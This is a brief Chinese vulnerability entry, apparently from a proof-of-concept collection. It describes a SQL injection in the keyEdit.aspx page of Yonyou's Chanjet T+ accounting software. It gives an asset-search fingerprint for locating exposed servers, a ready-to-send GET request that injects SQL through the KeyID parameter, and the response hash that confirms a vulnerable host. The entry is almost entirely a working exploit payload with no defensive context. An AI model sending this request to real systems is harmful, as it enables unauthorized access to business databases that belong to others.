# 用友畅捷通T+KeyEdit注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`app="畅捷通-TPlus"`
- **请求**：`GET /keyEdit.aspx?KeyID=222%27%20and%201=(select%20md5(1))%20--&preload=1 HTTP/1.1`
- **响应特征**：200 a0b923820dcc509a